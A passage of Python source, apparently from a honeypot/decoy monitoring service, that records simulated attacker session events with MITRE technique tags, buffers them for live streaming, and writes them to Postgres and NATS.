                "tactic": tactic,
            }]),
            "geo": json.dumps(geo),
            "tool_signatures": json.dumps([]),
            "tags": json.dumps([]),
        }
        events.append(event)

        sse_event = {"subject": f"cicdecoy.decoy.events.{event['event_type']}", "ts": ts.isoformat(), "payload": {
            **event,
            "username": username,
            "raw_data": {"command": cmd, "response": "...", "username": username},
            "mitre_techniques": [{"technique_id": tid, "technique_name": tname, "tactic": tactic}],
            "geo": geo,
            "tool_signatures": [],
            "tags": [],
        }}
        event_buffer.append(sse_event)
        for q in subscribers:
            try:
                q.put_nowait(sse_event)
            except asyncio.QueueFull:
                pass

    if len(event_buffer) > MAX_BUFFER:
        del event_buffer[:len(event_buffer) - MAX_BUFFER]

    db_written = False
    if db_pool:
        try:
            async with db_pool.acquire() as conn:
                await conn.executemany("""
                    INSERT INTO decoy_events (
                        event_id, timestamp, decoy_name, decoy_tier,
                        session_id, event_type, source_ip, source_port,
                        severity, raw_data, mitre_techniques, geo,
                        tool_signatures, tags
                    ) VALUES (
                        $1, $2::TIMESTAMPTZ, $3, $4,
                        $5, $6, $7::INET, $8,
                        $9, $10::JSONB, $11::JSONB, $12::JSONB,
                        $13::JSONB, $14::JSONB
                    )
                """, [
                    (
                        e["event_id"],
                        e["timestamp"],
                        e["decoy_name"],
                        e["decoy_tier"],
                        e["session_id"],
                        e["event_type"],
                        e["source_ip"],
                        e["source_port"],
                        e["severity"],
                        e["raw_data"],
                        e["mitre_techniques"],
                        e["geo"],
                        e["tool_signatures"],
                        e["tags"],
                    )
                    for e in events
                ])
            db_written = True
        except Exception as ex:
            print(f"[inject-session] DB write failed: {ex}")

    nats_published = False
    if nc and nc.is_connected:
        try:
            for e in events:
                subject = f"cicdecoy.decoy.events.{e['event_type']}"
                await nc.publish(subject, json.dumps({
                    **e,
                    "raw_data": json.loads(e["raw_data"]),
                    "mitre_techniques": json.loads(e["mitre_techniques"]),
                    "geo": json.loads(e["geo"]),
                }).encode())
            nats_published = True
        except Exception as ex:
            print(f"[inject-session] NATS publish failed: {ex}")

    return {
        "status": "ok",
        "session_id": session_id,
        "events": len(events),
        "tactics": list(tactics_seen),
        "tactic_count": len(tactics_seen),
        "db_written": db_written,
        "nats_published": nats_published,
        "source_ip": src_ip,
    }


# ── Serve index.html ────────────────────────────────
@app.get("/", response_class=HTMLResponse)
async def index():
    with open("static/index.html") as f:
        return f.read()